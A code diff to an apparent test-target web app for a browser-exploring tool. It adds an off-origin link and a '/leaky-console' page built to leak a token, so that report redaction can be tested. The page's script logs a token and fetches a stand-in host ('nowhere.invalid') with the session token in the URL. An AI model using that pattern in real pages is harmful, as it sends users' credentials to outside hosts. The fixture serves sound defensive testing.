@@ -58,7 +58,13 @@ def create_target_app(state: TargetState | None = None) -> FastAPI:
     async def home() -> HTMLResponse:
         return _page(
             "Home",
-            '<a href="/login">Sign in</a><a href="/records">Records</a><p id="status">ready</p>',
+            '<a href="/login">Sign in</a><a href="/records">Records</a>'
+            # A real page links off its own origin. Without one here, "an explorer does
+            # not wander off-origin" could only be tested by pointing the policy at a
+            # different host — which, now that a run seeds itself from that policy, tests
+            # something else entirely.
+            '<a href="https://elsewhere.test/pricing">Elsewhere</a>'
+            '<p id="status">ready</p>',
         )
 
     @app.get("/login", response_class=HTMLResponse)
@@ -152,6 +158,21 @@ def create_target_app(state: TargetState | None = None) -> FastAPI:
             "Console error",
             "<script>console.error('deliberate console failure');"
             "fetch('/missing-endpoint');</script>",
+        )
+
+    @app.get("/leaky-console", response_class=HTMLResponse)
+    async def leaky_console() -> HTMLResponse:
+        """The two ways a credential escapes through the browser's own diagnostics.
+
+        A console message printing a token is what a well-meaning debug line does, and a
+        request to a host that does not resolve keeps its whole URL — query string
+        included. Both end up in the run report now, so both have to arrive redacted.
+        """
+        return _page(
+            "Leaky console",
+            f"<script>console.error('auth failed for token {LEAKED_TOKEN}');"
+            f"fetch('http://nowhere.invalid/callback?session_token={LEAKED_TOKEN}')"
+            ".catch(function () {});</script>",
         )
 
     @app.get("/secrets", response_class=HTMLResponse)
